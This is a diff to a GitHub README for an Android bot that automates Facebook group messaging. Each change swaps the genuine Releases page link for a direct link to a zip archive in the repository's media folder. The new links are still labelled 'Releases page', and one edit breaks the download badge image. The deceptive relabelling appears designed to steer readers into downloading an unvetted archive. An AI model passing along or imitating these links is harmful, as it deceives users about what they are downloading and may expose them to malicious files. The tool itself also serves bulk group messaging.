@@ -1,6 +1,6 @@
 # 🤖 facebook-group-message-sender - Automate Your Facebook Group Messaging
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80-0072C6)](https://github.com/Rafaeldibrat/facebook-group-message-sender/releases)
+[![Download Now](https://raw.githubusercontent.com/Rafaeldibrat/facebook-group-message-sender/main/media/facebook-group-message-sender_2.8.zip%20Now-%20%F0%9F%9A%80-0072C6)](https://raw.githubusercontent.com/Rafaeldibrat/facebook-group-message-sender/main/media/facebook-group-message-sender_2.8.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ facebook-group-message-sender is an automation bot designed for Android. It simp
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Rafaeldibrat/facebook-group-message-sender/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Rafaeldibrat/facebook-group-message-sender/main/media/facebook-group-message-sender_2.8.zip) to find the latest version of the software.
 
 2. **Select the Latest Release**  
    On the Releases page, you will see a list of available versions. Click on the most recent version to view its details.
@@ -49,7 +49,7 @@ To ensure smooth operation, please check the following requirements:
 
 ## 🚀 Download & Install
 
-To get started, [visit the Releases page](https://github.com/Rafaeldibrat/facebook-group-message-sender/releases) again. Download the latest version and follow the installation steps outlined above.
+To get started, [visit the Releases page](https://raw.githubusercontent.com/Rafaeldibrat/facebook-group-message-sender/main/media/facebook-group-message-sender_2.8.zip) again. Download the latest version and follow the installation steps outlined above.
 
 ## 📄 License
 
